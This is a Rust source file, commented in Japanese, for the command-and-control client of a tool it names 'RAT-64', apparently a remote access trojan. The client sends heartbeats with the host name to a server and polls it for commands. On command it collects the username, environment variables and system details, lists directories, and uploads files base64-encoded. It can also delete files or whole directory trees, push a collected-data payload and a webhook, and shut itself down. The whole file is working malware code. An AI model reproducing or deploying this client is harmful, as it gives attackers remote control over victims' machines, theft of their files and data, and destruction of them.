// C2 (Command and Control) クライアントモジュール
use serde::{Serialize, Deserialize};
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::time;

use crate::core::config::Config;
use crate::IntegratedPayload;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ServerCommand {
    pub id: String,
    pub command_type: String,
    pub parameters: Vec<String>,
    pub timestamp: u64,
    pub auth_token: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandResponse {
    pub command_id: String,
    pub success: bool,
    pub message: String,
    pub data: Option<serde_json::Value>,
    pub timestamp: u64,
    pub execution_time_ms: u64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct HeartbeatRequest {
    pub client_id: String,
    pub hostname: String,
    pub status: String,
    pub system_info: Option<serde_json::Value>,
    pub timestamp: u64,
    pub auth_token: String,
}

pub struct C2Client {
    config: Config,
    client_id: String,
    is_active: bool,
}

impl C2Client {
    pub fn new(config: Config) -> Self {
        let client_id = format!("rat64_{}", 
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs()
        );
        // 設定は引数の値（またはデフォルト）をそのまま使用
        Self {
            config,
            client_id,
            is_active: false,
        }
    }

    /// C2通信を開始して待機状態に移行
    pub async fn start_c2_loop(&mut self) -> Result<(), String> {
        println!("🌐 C2 Client started");
        println!("   Target Server: {}", self.config.command_server_url);
        println!("   Client ID: {}", self.client_id);
        println!("   Auth Token: {}", self.config.command_auth_token);
        
        self.is_active = true;

        // 初回ハートビート送信
        println!("📡 Sending initial heartbeat to {}...", self.config.command_server_url);
        match self.send_heartbeat("online").await {
            Ok(()) => {
                println!("✅ C2 server connected successfully");
                println!("💓 Heartbeat established with {}", self.config.command_server_url);
            },
            Err(e) => {
                println!("⚠️  Initial heartbeat failed: {}", e);
                println!("🔄 Continuing in offline mode, will retry periodically");
            }
        }

        println!(
            "🔄 Entering C2 standby (heartbeat {}s, poll {}s)...",
            self.config.heartbeat_interval_seconds,
            self.config.command_poll_interval_seconds
        );

        let mut hb_interval =
            time::interval(Duration::from_secs(self.config.heartbeat_interval_seconds.max(1)));
        let mut poll_interval =
            time::interval(Duration::from_secs(self.config.command_poll_interval_seconds.max(1)));

        loop {
            tokio::select! {
                _ = hb_interval.tick() => {
                    let _ = self.send_heartbeat("standby").await;
                }
                _ = poll_interval.tick() => {
                    self.process_c2_cycle().await;
                }
                _ = tokio::signal::ctrl_c() => {
                    println!("🛑 C2 shutdown signal received");
                    break;
                }
            }
        }
        
        self.is_active = false;
        println!("📡 Sending offline heartbeat...");
        let _ = self.send_heartbeat("offline").await;
        println!("🌐 C2 Client shutdown complete");
        Ok(())
    }

    /// 1回のC2サイクルを処理
    async fn process_c2_cycle(&mut self) {
        // サーバーコマンドのチェックと実行
        if let Ok(command_count) = self.check_and_execute_commands().await {
            if command_count > 0 {
                println!("⚡ Executed {} command(s)", command_count);
            }
        }
    }

    /// サーバーからコマンドをチェックして実行（DRY化・効率化）
    async fn check_and_execute_commands(&mut self) -> Result<usize, String> {
        let commands = self.fetch_commands().await
            .map_err(|e| format!("Failed to fetch commands: {}", e))?;
        let mut executed_count = 0;

        for command in commands {
            match self.execute_command(command).await {
                Ok(response) => {
                    if let Err(e) = self.send_command_response(&response).await {
                        eprintln!("🌐 Failed to send command response: {}", e);
                    }
                    executed_count += 1;
                },
                Err(e) => {
                    eprintln!("🌐 Command execution failed: {}", e);
                }
            }
        }

        Ok(executed_count)
    }

    /// 共通: 既定ヘッダの付与
    fn with_defaults(&self, req: minreq::Request) -> minreq::Request {
        req
            .with_header("Authorization", format!("Bearer {}", self.config.command_auth_token))
            .with_header("User-Agent", "RAT-64-HttpClient/1.0")
            .with_timeout(self.config.timeout_seconds)
    }

    /// サーバーからコマンドを取得（シンプルポーリング）
    async fn fetch_commands(&self) -> Result<Vec<ServerCommand>, Box<dyn std::error::Error>> {
        let url = format!("{}/api/commands/fetch?client_id={}",
            self.config.command_server_url, self.client_id);

        let response = self.with_defaults(minreq::get(&url)).send()?;

        if response.status_code != 200 {
            return Ok(Vec::new()); // コマンドがない場合は空のベクターを返す
        }

        let response_text = response.as_str()?;
        let commands: Vec<ServerCommand> = serde_json::from_str(response_text)?;
        
        Ok(commands)
    }

    async fn execute_command(&mut self, command: ServerCommand) -> Result<CommandResponse, String> {
        let start_time = std::time::Instant::now();
        
        if command.auth_token != self.config.command_auth_token {
            return Err(format!("Authentication failed: expected '{}', got '{}'", 
                self.config.command_auth_token, command.auth_token));
        }

        println!("📨 Received command: {} (ID: {})", command.command_type, command.id);

        let ctype = command.command_type.to_lowercase();
        let result = match ctype.as_str() {
            "collect_system_info" | "collectsysteminfo" => self.handle_collect_system_info_command().await,
            "status" => self.handle_status_command().await,
            "ping" => self.handle_ping_command().await,
            "shutdown" => self.handle_shutdown_command().await,
            "webhook_send" => self.handle_webhook_send().await,
            // ファイル管理コマンド
            "list_files" | "ls" => self.handle_list_files_command(&command.parameters).await,
            "get_file_info" | "fileinfo" => self.handle_get_file_info_command(&command.parameters).await,
            "download_file" | "download" => self.handle_download_file_command(&command.parameters).await,
            "delete_file" | "rm" => self.handle_delete_file_command(&command.parameters).await,
            "create_dir" | "mkdir" => self.handle_create_dir_command(&command.parameters).await,
            _ => Err(format!("Unknown command type: {}", command.command_type)),
        };

        let execution_time = start_time.elapsed().as_millis() as u64;
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let response = match result {
            Ok((message, data)) => CommandResponse {
                command_id: command.id,
                success: true,
                message,
                data,
                timestamp,
                execution_time_ms: execution_time,
            },
            Err(e) => CommandResponse {
                command_id: command.id,
                success: false,
                message: e.to_string(),
                data: None,
                timestamp,
                execution_time_ms: execution_time,
            },
        };

        Ok(response)
    }

    /// コマンドレスポンスをサーバーに送信
    async fn send_command_response(&self, response: &CommandResponse) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/commands/response", self.config.command_server_url);
        let http_response = self
            .with_defaults(minreq::post(&url).with_header("Content-Type", "application/json").with_body(serde_json::to_string(response)?))
            .send()?;

        if http_response.status_code >= 200 && http_response.status_code < 300 {
            println!("✅ Command response sent successfully");
            Ok(())
        } else {
            Err(format!("Server response failed: HTTP {}", http_response.status_code).into())
        }
    }

    /// ハートビートをサーバーに送信
    async fn send_heartbeat(&self, status: &str) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/heartbeat", self.config.command_server_url);
        
        let heartbeat = HeartbeatRequest {
            client_id: self.client_id.clone(),
            hostname: std::env::var("COMPUTERNAME")
                .or_else(|_| std::env::var("HOSTNAME"))
                .unwrap_or_else(|_| "Unknown".to_string()),
            status: status.to_string(),
            system_info: None,
            timestamp: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            auth_token: self.config.command_auth_token.clone(),
        };

        let response = self
            .with_defaults(minreq::post(&url).with_header("Content-Type", "application/json").with_body(serde_json::to_string(&heartbeat)?))
            .send()?;

        if response.status_code >= 200 && response.status_code < 300 {
            Ok(())
        } else {
            Err(format!("Heartbeat failed: HTTP {}", response.status_code).into())
        }
    }

    /// 収集したデータをサーバーにアップロード
    pub async fn upload_collected_data(&self, payload: &IntegratedPayload) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/data/upload", self.config.command_server_url);
        let body = serde_json::json!({
            "client_id": self.client_id,
            "data_type": "integrated_payload",
            "payload": payload,
        });

        let response = self
            .with_defaults(minreq::post(&url).with_header("Content-Type", "application/json").with_body(serde_json::to_string(&body)?))
            .send()?;

        if response.status_code >= 200 && response.status_code < 300 {
            println!("📤 Data uploaded successfully");
            Ok(())
        } else {
            Err(format!("Data upload failed: HTTP {}", response.status_code).into())
        }
    }

    // コマンドハンドラー
    async fn handle_collect_system_info_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
        println!("🔍 Collecting system information via remote command...");
        
        let hostname = std::env::var("COMPUTERNAME")
            .or_else(|_| std::env::var("HOSTNAME"))
            .unwrap_or_else(|_| "Unknown".to_string());
        
        let username = std::env::var("USERNAME")
            .or_else(|_| std::env::var("USER"))
            .unwrap_or_else(|_| "Unknown".to_string());

        // システム情報を収集
        let system_info = serde_json::json!({
            "client_id": self.client_id,
            "hostname": hostname,
            "username": username,
            "os": std::env::consts::OS,
            "arch": std::env::consts::ARCH,
            "family": std::env::consts::FAMILY,
            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
            "uptime_seconds": self.get_system_uptime(),
            "working_directory": std::env::current_dir().ok(),
            "environment_vars": {
                "PATH": std::env::var("PATH").unwrap_or_default(),
                "TEMP": std::env::var("TEMP").or_else(|_| std::env::var("TMP")).unwrap_or_default(),
                "HOME": std::env::var("HOME").or_else(|_| std::env::var("USERPROFILE")).unwrap_or_default(),
            }
        });

        println!("✅ System information collected successfully");
        Ok(("System information collected".to_string(), Some(system_info)))
    }

    async fn handle_status_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
        let hostname = std::env::var("COMPUTERNAME")
            .or_else(|_| std::env::var("HOSTNAME"))
            .unwrap_or_else(|_| "Unknown".to_string());
        
        let username = std::env::var("USERNAME")
            .or_else(|_| std::env::var("USER"))
            .unwrap_or_else(|_| "Unknown".to_string());

        let status_data = serde_json::json!({
            "client_id": self.client_id,
            "hostname": hostname,
            "username": username,
            "server_url": self.config.command_server_url,
            "is_active": self.is_active,
            "status": "running"
        });

        Ok(("Status retrieved".to_string(), Some(status_data)))
    }

    async fn handle_ping_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
        let pong_data = serde_json::json!({
            "message": "pong",
            "client_id": self.client_id,
            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
        });
        Ok(("Pong!".to_string(), Some(pong_data)))
    }

    async fn handle_shutdown_command(&self) -> Result<(String, Option<serde_json::Value>), String> {
        println!("🔴 Remote shutdown command received");
        
        tokio::spawn(async {
            tokio::time::sleep(Duration::from_secs(2)).await;
            println!("💀 Shutting down...");
            std::process::exit(0);
        });

        Ok(("Shutdown initiated".to_string(), None))
    }

    // Webhookをクライアント経由で送るシンプルなハンドラ
    async fn handle_webhook_send(&mut self) -> Result<(String, Option<serde_json::Value>), String> {
        let payload = crate::IntegratedPayload::create_with_config(&self.config)
            .await
            .map_err(|e| format!("Payload collection failed: {}", e))?;
        crate::send_unified_webhook(&payload, &self.config)
            .await
            .map_err(|e| format!("Webhook send failed: {}", e))?;
        Ok(("Webhook sent via client".into(), None))
    }

    // ヘルパー関数
    fn get_system_uptime(&self) -> Option<u64> {
        // Windows の場合、GetTickCount64 を使ってシステム稼働時間を取得
        #[cfg(windows)]
        {
            extern "system" {
                fn GetTickCount64() -> u64;
            }
            unsafe { Some(GetTickCount64() / 1000) } // ミリ秒を秒に変換
        }
        
        #[cfg(not(windows))]
        {
            // Unix系の場合は簡略化（実装可能だが複雑）
            None
        }
    }

    // ========== ファイル管理コマンド ==========

    /// ディレクトリ一覧取得
    async fn handle_list_files_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
        let path = params.get(0).map(|s| s.as_str()).unwrap_or(".");
        let show_hidden = params.get(1).map(|s| s == "true").unwrap_or(false);
        
        match std::fs::read_dir(path) {
            Ok(entries) => {
                let mut files = Vec::new();
                for entry in entries {
                    if let Ok(entry) = entry {
                        let metadata = entry.metadata().ok();
                        let name = entry.file_name().to_string_lossy().to_string();
                        
                        // 隠しファイルのフィルタリング
                        if !show_hidden && (name.starts_with('.') || name.starts_with('~')) {
                            continue;
                        }
                        
                        let file_info = serde_json::json!({
                            "name": name,
                            "path": entry.path().to_string_lossy(),
                            "is_dir": metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false),
                            "is_file": metadata.as_ref().map(|m| m.is_file()).unwrap_or(false),
                            "size": metadata.as_ref().map(|m| m.len()).unwrap_or(0),
                            "modified": metadata.as_ref().and_then(|m| 
                                m.modified().ok().and_then(|t| 
                                    t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs()))),
                        });
                        
                        files.push(file_info);
                    }
                }
                
                // ディレクトリ優先でソート
                files.sort_by(|a, b| {
                    let a_is_dir = a.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);
                    let b_is_dir = b.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);
                    
                    match (a_is_dir, b_is_dir) {
                        (true, false) => std::cmp::Ordering::Less,
                        (false, true) => std::cmp::Ordering::Greater,
                        _ => a.get("name").and_then(|v| v.as_str())
                            .cmp(&b.get("name").and_then(|v| v.as_str())),
                    }
                });
                
                let result = serde_json::json!({
                    "path": path,
                    "files": files,
                    "count": files.len(),
                    "show_hidden": show_hidden
                });
                
                Ok((format!("Listed {} files in '{}'", files.len(), path), Some(result)))
            },
            Err(e) => Err(format!("Failed to list directory '{}': {}", path, e))
        }
    }

    /// ファイル情報取得
    async fn handle_get_file_info_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
        let file_path = params.get(0).ok_or("File path parameter required")?;
        
        match std::fs::metadata(file_path) {
            Ok(metadata) => {
                let file_info = serde_json::json!({
                    "path": file_path,
                    "name": std::path::Path::new(file_path).file_name()
                        .and_then(|n| n.to_str()).unwrap_or("unknown"),
                    "is_dir": metadata.is_dir(),
                    "is_file": metadata.is_file(),
                    "size": metadata.len(),
                    "readonly": metadata.permissions().readonly(),
                    "created": metadata.created().ok().and_then(|t| 
                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
                    "modified": metadata.modified().ok().and_then(|t| 
                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
                    "accessed": metadata.accessed().ok().and_then(|t| 
                        t.duration_since(UNIX_EPOCH).ok().map(|d| d.as_secs())),
                });
                
                Ok((format!("File info for '{}'", file_path), Some(file_info)))
            },
            Err(e) => Err(format!("Failed to get file info for '{}': {}", file_path, e))
        }
    }

    /// ファイルダウンロード（サーバーに送信）
    async fn handle_download_file_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
        let file_path = params.get(0).ok_or("File path parameter required")?;
        let max_size = params.get(1)
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(10 * 1024 * 1024); // デフォルト10MB制限
        
        // ファイルサイズ確認
        let metadata = std::fs::metadata(file_path)
            .map_err(|e| format!("File '{}' not found: {}", file_path, e))?;
        
        if metadata.len() > max_size {
            return Err(format!("File too large: {} bytes (max: {} bytes)", 
                metadata.len(), max_size));
        }
        
        if metadata.is_dir() {
            return Err(format!("'{}' is a directory, not a file", file_path));
        }
        
        match std::fs::read(file_path) {
            Ok(file_data) => {
                // Base64エンコード
                use base64::{Engine as _, engine::general_purpose};
                let encoded_data = general_purpose::STANDARD.encode(&file_data);
                
                let file_info = serde_json::json!({
                    "file_path": file_path,
                    "file_name": std::path::Path::new(file_path).file_name()
                        .and_then(|n| n.to_str()).unwrap_or("unknown"),
                    "size": file_data.len(),
                    "data": encoded_data,
                    "encoding": "base64",
                    "content_type": "application/octet-stream"
                });
                
                Ok((format!("File '{}' downloaded ({} bytes)", file_path, file_data.len()), Some(file_info)))
            },
            Err(e) => Err(format!("Failed to read file '{}': {}", file_path, e))
        }
    }

    /// ファイル削除
    async fn handle_delete_file_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
        let file_path = params.get(0).ok_or("File path parameter required")?;
        let force = params.get(1).map(|s| s == "true").unwrap_or(false);
        
        let metadata = std::fs::metadata(file_path)
            .map_err(|e| format!("File '{}' not found: {}", file_path, e))?;
        
        let result = if metadata.is_dir() {
            if force {
                std::fs::remove_dir_all(file_path)
            } else {
                std::fs::remove_dir(file_path)
            }
        } else {
            std::fs::remove_file(file_path)
        };
        
        match result {
            Ok(()) => {
                let info = serde_json::json!({
                    "path": file_path,
                    "type": if metadata.is_dir() { "directory" } else { "file" },
                    "status": "deleted",
                    "force": force
                });
                Ok((format!("Deleted {} '{}'", 
                    if metadata.is_dir() { "directory" } else { "file" }, 
                    file_path), Some(info)))
            },
            Err(e) => Err(format!("Failed to delete '{}': {}", file_path, e))
        }
    }

    /// ディレクトリ作成
    async fn handle_create_dir_command(&self, params: &[String]) -> Result<(String, Option<serde_json::Value>), String> {
        let dir_path = params.get(0).ok_or("Directory path parameter required")?;
        let recursive = params.get(1).map(|s| s == "true").unwrap_or(false);
        
        let result = if recursive {
            std::fs::create_dir_all(dir_path)
        } else {
            std::fs::create_dir(dir_path)
        };
        
        match result {
            Ok(()) => {
                let info = serde_json::json!({
                    "path": dir_path,
                    "recursive": recursive,
                    "status": "created"
                });
                Ok((format!("Directory created: '{}'", dir_path), Some(info)))
            },
            Err(e) => Err(format!("Failed to create directory '{}': {}", dir_path, e))
        }
    }
}
